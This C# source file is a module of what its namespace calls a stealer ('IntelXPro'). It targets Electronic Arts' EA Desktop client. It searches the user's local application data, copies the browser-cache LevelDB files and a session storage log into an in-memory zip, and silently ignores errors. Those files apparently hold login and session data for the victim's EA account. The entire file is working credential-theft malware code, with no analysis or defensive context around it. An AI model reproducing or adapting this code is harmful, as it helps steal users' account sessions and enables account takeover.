using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class ElectronicArts : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Electronic Arts", "EA Desktop", "CEF");
            if (!Directory.Exists(text))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Electronic Arts";
            int num = 0;
            string path = Path.Combine(text, "BrowserCache", "EADesktop", "Local Storage", "leveldb");
            if (Directory.Exists(path))
            {
                string[] files = Directory.GetFiles(path);
                foreach (string text2 in files)
                {
                    try
                    {
                        if (string.Equals(Path.GetExtension(text2), ".ldb", StringComparison.OrdinalIgnoreCase))
                        {
                            string text3 = "Electronic Arts\\leveldb\\" + Path.GetFileName(text2);
                            zip.AddFile(text3, File.ReadAllBytes(text2));
                            counterApplications.Files.Add(text2 + " => " + text3);
                            num++;
                        }
                    }
                    catch
                    {
                    }
                }
            }
            string text4 = Path.Combine(text, "BrowserCache", "EADesktop", "Session Storage", "000003.log");
            if (File.Exists(text4))
            {
                try
                {
                    string text5 = "Electronic Arts\\Session Storage\\000003.log";
                    zip.AddFile(text5, File.ReadAllBytes(text4));
                    counterApplications.Files.Add(text4 + " => " + text5);
                    num++;
                }
                catch
                {
                }
            }
            if (num != 0)
            {
                counterApplications.Files.Add("Electronic Arts\\");
                counter.Games.Add(counterApplications);
            }
        }
    }
}
